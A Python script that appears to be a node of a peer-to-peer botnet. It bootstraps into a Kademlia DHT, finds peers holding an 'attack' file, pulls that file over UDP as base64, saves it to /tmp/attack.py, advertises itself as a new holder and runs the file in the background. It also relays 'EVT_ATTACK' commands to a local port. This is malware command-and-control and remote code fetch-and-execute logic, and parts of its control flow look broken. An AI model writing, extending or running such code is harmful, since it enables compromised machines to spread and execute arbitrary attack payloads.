import asyncio
from kademlia.network import Server
import os
from random import randint, choice
import json
import base64
import sys
import time

# The logic can be extended to have attack and implant modules.
ATK_FILE = "/tmp/attack.py"
IMPL_FILE = "implant.zip"

FILE_RECEIVED = False
UDP_PORT = randint(11000, 12000)
BOOTSTARP_PORT = 5678
BOOTSTARP_IP = sys.argv[1]
BOOTSTRAP_NODES = [(BOOTSTARP_IP, BOOTSTARP_PORT)]
ATK_UDP_PORT = 9191


class EchoClientProtocol:
    def __init__(self, message, loop):
        self.message = message
        self.loop = loop
        self.transport = None

    def connection_made(self, transport):
        self.transport = transport
        print('Send:', self.message)
        self.transport.sendto(self.message.encode())

    def datagram_received(self, data, addr):
        local_msg = data.decode()
        print("Received data.")
        handle_msg(self.transport, local_msg, addr)

        print("Close the socket")
        self.transport.close()

    def error_received(self, exc):
        print('Error received:', exc)

    def connection_lost(self, exc):
        print("Socket closed, stop the event loop")
        loop = asyncio.get_event_loop()
        loop.stop()


class EchoServerProtocol:
    def connection_made(self, transport):
        self.transport = transport

    def datagram_received(self, data, addr):
        message = data.decode()
        print('Received %r from %s' % (message, addr))
        handle_msg(self.transport, message, addr)


def handle_msg(i_transport, i_data, i_addr):

    local_data = json.loads(i_data)
    cmd = local_data['cmd']

    if cmd == 'GET_ATK':
        print('GET_ATK from {}'.format(i_addr))
        l_data = None
        with open(ATK_FILE, 'br') as model:
            l_data = base64.b64encode(model.read())
            l_data = l_data.decode("utf-8")

        local_msg = {'cmd':'SET_ATK', 'data' : l_data}
        i_transport.sendto(json.dumps(local_msg).encode(), i_addr)
    
    elif cmd == 'SET_ATK':
        print('SET_ATK from {}'.format(i_addr))
        l_data = local_data['data']
        l_data = l_data.encode("utf-8")

        with open(ATK_FILE, 'bw') as f:
            f.write(base64.b64decode(l_data))
    
    elif cmd == "EVT_ATTACK":
        send_msg(i_data, '127.0.0.1', ATK_UDP_PORT)

    else:
        print('[-]Invalid message received.')


def send_msg(i_msg, i_ip, i_port):
    connect = loop.create_datagram_endpoint(lambda: EchoClientProtocol(i_msg, loop), remote_addr=(i_ip, i_port))
    transport, protocol = loop.run_until_complete(connect)
    #loop.run_until_complete(coro)


async def main_server(host, port):
    loop = asyncio.get_running_loop()
    server = await loop.create_server(EchoServerProtocol, host, port)
    await server.serve_forever()


def get_my_ip():
    f = os.popen("ip a | grep 'scope global' | awk '{ print $NF }'")
    local_eth = f.read().rstrip()
    f = os.popen("ip address show "+local_eth+" | grep -w 'inet' | awk '{print $2}' | cut -d '/' -f 1")
    # Keep some verifier, see the returned item is ok or not.
    return f.read().rstrip() 


MY_IP = get_my_ip()
loop = asyncio.get_event_loop()

print('[+]Starting UDP server on {}.'.format(UDP_PORT))
asyncio.run(main_server('0.0.0.0', UDP_PORT))

# Create a node and start listening on port 5678
node = Server()
loop.run_until_complete(node.listen(BOOTSTARP_PORT))
loop.run_until_complete(node.bootstrap(BOOTSTRAP_NODES))

print('[+]Getting ATK_FILES.')
ATK_HOLDERS = None
result = loop.run_until_complete(node.get('ATK_FILE'))
print(result)

while True:
    if not result is None:
        ATK_HOLDERS = result.split(',')
        # Get attack file
        some_ip_port = choice(ATK_HOLDERS).split(':')
        print('[+]Result {}'.format(some_ip_port))

        local_msg = {'cmd':'GET_ATK', 'data' : None}
        send_msg(json.dumps(local_msg), some_ip_port[0], some_ip_port[1])
   
        if os.path.exists(ATK_FILE):
            loop.run_until_complete(node.set("ATK_FILE", "{},{}:{}".format(result, MY_IP, UDP_PORT)))
            break
        # Wait for 2 seconds and then retry
        time.sleep(2)

    else:
        loop.run_until_complete(node.set("ATK_FILE", "{}:{}".format(MY_IP, UDP_PORT)))
        break


# Start the attack module??
f = os.popen("python3 {} {}&".format(ATK_FILE, BOOTSTARP_IP))
print(f.read())


if __name__ == '__main__':
  try:
    print('Starting main.')
    loop.run_forever()
  except KeyboardInterrupt:
    pass
  finally:
    node.stop()
    loop.close()
